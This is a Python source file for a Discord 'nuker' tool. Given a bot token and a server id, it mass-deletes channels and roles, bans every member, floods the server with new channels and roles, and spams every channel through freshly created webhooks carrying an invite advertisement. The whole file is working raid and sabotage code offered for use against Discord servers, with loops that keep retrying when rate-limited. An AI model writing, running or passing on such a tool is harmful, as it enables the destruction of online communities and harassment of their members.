import os, asyncio, aiohttp, sys, time
from datetime import datetime
from colorama import Fore
from packaging import version
try:
    from pystyle import Center
    import requests
except:
    os.system('pip install pystyle')
    os.system('pip install requests')

import ctypes

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

set_console_title("VishnuBro Nuker |dev By P6cy |developed for vishnu bro")   

    
__VERSION__ = '1.0'  

try:
    os.system('cls')
        
except:
    os.system('clear')
    
def get_token():
    global token
    token = input(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Enter your token: {Fore.LIGHTWHITE_EX}")
    headers = {
         "Authorization": f"Bot {token}"
    }
    if not 'id' in requests.session().get('https://discord.com/api/v9/users/@me', headers=headers).text:
        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Invalid token")
        return get_token()
get_token()

guild_id= input(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Enter your guild id: {Fore.LIGHTWHITE_EX}")

headers = {
    "Authorization": f"Bot {token}",
}

def purplepink(text):
    os.system(""); faded = ""
    red = 120
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

async def create_channel(session, channel_name, type: int = 0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Rate limited, waiting...")
                else:
                    if r.status in[200,201,204]:
                        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Created Channel in {guild_id} - {channel_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(datetime.timezone.utc).strftime(' %H:%M:%S.%f - ')}\x1b[38;5;141mCouldn't Create Channel in {guild_id}")
            pass


async def create_role(session, role_name, color: int = 0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': role_name, 'color': color}) as r:
                if r.status == 429:
                    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Rate limited, waiting...")
                else:
                    if r.status in[200,201,204]:
                        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Created Role in {guild_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(datetime.timezone.utc).strftime(' %H:%M:%S.%f - ')}\x1b[38;5;141mCouldn't Create Role in {guild_id}")
            pass

async def delete_channel(session, channel_id):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Rate limited, waiting...")
                else:
                    if r.status in[200,201,204]:
                        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Deleted Channel in {guild_id} - {channel_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(datetime.timezone.utc).strftime(' %H:%M:%S.%f - ')}\x1b[38;5;141mCouldn't Delete Channel in {guild_id}")
            pass
async def get_roles():
    roleIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
                m = await r.json()
                for role in m:
                    roleIDS.append(role['id'])
    except:
        print(f"⚠️ Got RateLimited sus................")

    return roleIDS

async def get_users():
    userIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members", headers=headers) as r:
                m = await r.json()
            for user in m:
                userIDS.append(user['user']['id'])
    except:
        print(f"⚠️ Got RateLimited sus................")
    
    return userIDS

async def get_channels():
    channelIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
                m = await r.json()
                for channel in m:
                    channelIDS.append(channel['id'])
    except:
        print(f"⚠️ Got RateLimited sus................")

    return channelIDS

async def ban_members(session, member_id:str):
    while True:
        try:
            async with session.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Rate limited, waiting...")
                else:
                    if r.status in[200,201,204]:
                        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Banned Member in {guild_id} - {member_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(datetime.timezone.utc).strftime(' %H:%M:%S.%f - ')}\x1b[38;5;141mCouldn't Ban Member in {guild_id}")
            pass


async def role_delete(session, role_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Rate limited, waiting...")
                else:
                    if r.status in[200,201,204]:
                        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Deleted Role in {guild_id} - {role_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(datetime.timezone.utc).strftime(' %H:%M:%S.%f - ')}\x1b[38;5;141mCouldn't Delete Role in {guild_id}")
            pass


async def send_message(hook, message, amount:int):
    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            await session.post(hook,json={'content': message, 'tts': False})

async def weebhook_spam(session , channel_id, web_name , msg_amt:int ,msg):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=headers, json={'name': web_name}) as r:
                if r.status == 429:
                    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Rate limited, waiting...")
                else:
                    if r.status in[200,201,204]:
                        m = await r.json()
                        hook = m['url']
                        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTYELLOW_EX}*{Fore.LIGHTWHITE_EX}] {Fore.LIGHTWHITE_EX}Created Webhook in {guild_id} - {web_name}")
                        await send_message(hook, msg, msg_amt)
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(datetime.timezone.utc).strftime(' %H:%M:%S.%f - ')}\x1b[38;5;141mCouldn't Create Webhook in {guild_id}")
            pass

def slow_write(text):
    for x in text: print(x, end='');sys.stdout.flush();time.sleep(0.0005)

async def main():
    try:
        os.system('cls')
    except:
        os.system('clear')
    
    logo = Center.XCenter(f"""
⢀⣤⣶⣾⣿⣿⡿⠿⠛⠋⠉⠁⠀⣀⡀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣀
⣿⣿⠟⠋⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣷⣦⣤⣀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿
⠋⠀⠀⠀⣠⣶⣾⣿⣿⠿⠟⠛⠋⠉⠀⠀⠈⠉⠛⠿⢿⣿⣷⣶⣤⣀⠀⠈⠙⠻
⠀⠀⢀⣾⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡀⠀⠀
⠀⢠⣾⣿⣿⠏⠀⠀⠀⢀⣠⣤⣶⣶⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠈⣿⣿⣿⡄⠀
⠀⢸⣿⣿⡇⠀⠀⠀⣰⣿⡿⠋⠁⠀⠀⠀⠈⠙⢿⣿⣦⠀⠀⠀⠀⢸⣿⣿⡇⠀
⠀⠈⣿⣿⣷⠀⠀⠀⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⣾⣿⣿⠁⠀
⠀⠀⠘⣿⣿⣧⠀⠀⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠀⠀⠀⣼⣿⡿⠃⠀⠀
⠀⠀⠀⠘⢿⣿⣷⣀⠙⢿⣿⣦⣤⣀⣀⣀⣤⣴⣿⣿⠟⠀⠀⣰⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⠿⣿⣷⣶⣤⣉⣛⣛⣛⣛⣉⣉⣤⣶⣾⠿⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⠿⠿⠿⠟⠛⠉
⠀⠀⠀⠀⠀⠀⠀
      ᐯ Ꭵ ᔑ Ꮋ ᑎ ᑘ    ᑎ ᑘ ᐸ Ꮋ ᘿ ᖇ
                        Developed By P6CY | For VishnuBro
""")

    time.sleep(0.00002)
    print(purplepink(logo), end='')
  

    print(Center.XCenter(f"""                                  
                          \033[38;2;255;0;205m╔══════════════════════════════╦═══════════════════════════════╗\033[0m
                          \033[38;2;255;0;180m║   \033[37mVersion: {version.parse(__VERSION__)}      \033[38;2;255;0;180m║   \033[37mDeveloper: p6cy Justice          \033[38;2;255;0;180m║
                          \033[38;2;255;0;155m╚══════════════════════════════╩═══════════════════════════════╝\033[0m
                 \033[38;2;255;0;130m╔══════════════════════════╦══════════════════════════╦════════════════════════╗\033[0m
                 \033[38;2;255;0;105m║   \033[37m[1] Delete Channels    \033[38;2;255;0;105m║    \033[37m[2] Delete Roles      \033[38;2;255;0;105m║    \033[37m[3] Ban Members     \033[38;2;255;0;105m║\033[0m
                 \033[38;2;255;0;80m╠══════════════════════════╬══════════════════════════╬════════════════════════╣\033[0m
                 \033[38;2;255;0;55m║   \033[37m[4] Create Channels    \033[38;2;255;0;55m║    \033[37m[5] Create Roles      \033[38;2;255;0;55m║    \033[37m[6] Webhook Spam    \033[38;2;255;0;55m║\033[0m
                 \033[38;2;255;0;30m╚══════════════════════════╩══════════════════════════╩════════════════════════╝\033[0m             
    """))
    choose = input(Fore.LIGHTCYAN_EX+"                                        > ")
    if choose == '1':
        channels = await get_channels()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_channel(session, channel_id) for channel_id in channels])

        await asyncio.sleep(1)
        await main()
    
    elif choose == '2':
        roles = await get_roles()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[role_delete(session, role_id) for role_id in roles])
           

        await asyncio.sleep(1)
        await main()
    
    elif choose == '4':
        chan_name = input(Fore.LIGHTCYAN_EX+"                                        Channel Name:  ")
        amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_channel(session, chan_name, 0) for _ in range(amt)])
            
            
        await asyncio.sleep(1)
        await main()        
    elif choose == '6':
        web_name = "Ran By .GG/VAASTE"
        web_msg = input(Fore.LIGHTCYAN_EX+"                                        Webhook Content:  ")
        msg_amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount of Messages:  "))
        
        channels = await get_channels()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[weebhook_spam(session, channel_id, web_name, msg_amt, web_msg) for channel_id in channels])
            
            
            
        await asyncio.sleep(1)
        await main()
    elif choose == '3':
        members = await get_users()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[ban_members(session, member_id) for member_id in members])
            
            
        await asyncio.sleep(1)
        await main()
        
    elif choose == '5':
        role_name = input(Fore.LIGHTCYAN_EX+"                                        Role Name:  ")
        amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_role(session, role_name) for _ in range(amt)])
            
            
        await asyncio.sleep(1)
        await main()
        
    else:
        await asyncio.sleep(1)
        await main()

if __name__ == "__main__":
    
    asyncio.run(main())    
